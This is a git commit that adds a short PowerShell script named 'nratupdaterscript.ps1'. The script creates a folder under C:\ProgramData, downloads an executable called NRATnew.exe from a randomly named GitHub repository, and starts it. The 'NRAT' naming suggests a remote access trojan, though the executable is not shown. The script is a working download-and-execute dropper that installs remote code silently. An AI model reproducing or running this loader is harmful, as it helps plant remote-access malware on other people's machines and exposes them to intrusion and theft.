a9c49cddb73f5972f84df8f1fed15e9534890a6d
ErrorLoadingUsername-404 <101419715+ErrorLoadingUsername-404@users.noreply.github.com>
2022-05-22 17:32:30 -0700

    Add files via upload

---
+++ nratupdaterscript.ps1
@@ -0,0 +1,7 @@
+﻿cd C:\ProgramData\zDATAxD
+md nratmyupdate
+cd nratmyupdate
+$source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/NRATnew.exe'
+$destination = 'C:\ProgramData\zDATAxD\nratmyupdate\NRATnew.exe'
+Invoke-WebRequest -Uri $source -OutFile $destination
+start NRATnew.exe
